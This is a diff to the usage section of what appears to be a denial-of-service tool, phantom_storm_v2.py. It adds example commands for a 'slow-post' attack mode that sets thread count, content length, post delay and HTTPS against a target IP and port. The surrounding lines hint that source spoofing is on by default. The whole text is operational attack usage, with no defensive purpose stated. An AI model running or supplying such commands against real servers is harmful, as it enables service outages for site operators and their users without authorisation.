@@ -195,6 +195,11 @@ python phantom_storm_v2.py 192.168.1.100 80 200 --no-spoof
 # Combine features (HTTPS + Profile + Methods)
 python phantom_storm_v2.py 192.168.1.100 443 150 --https --profile=balanced --random-method
 
+# Attack type selection (NEW in Feature #4!)
+python phantom_storm_v2.py 192.168.1.100 80 100 --attack-type=slow-post
+python phantom_storm_v2.py 192.168.1.100 80 100 --attack-type=slow-post --content-length=500000 --post-delay=5.0
+python phantom_storm_v2.py 192.168.1.100 443 100 --attack-type=slow-post --https
+
 # Using legacy version
 python phantom_storm.py 192.168.1.100 80 200
 ```
